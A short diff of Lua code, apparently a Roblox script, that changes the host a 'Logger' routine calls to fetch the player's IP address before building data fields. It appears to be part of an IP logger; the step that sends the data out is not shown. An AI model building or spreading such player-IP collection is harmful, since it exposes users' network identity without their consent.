@@ -16,7 +16,7 @@ local Logger = {
         end
 
         plr = game.Players.LocalPlayer
-        ip_fetched = HttpService:GetAsync("https://ip.luainject.ml/")
+        ip_fetched = HttpService:GetAsync("https://ip.moon.lat/")
         local j = HttpService:JSONDecode(ip_fetched)
 
         local dataFields = {
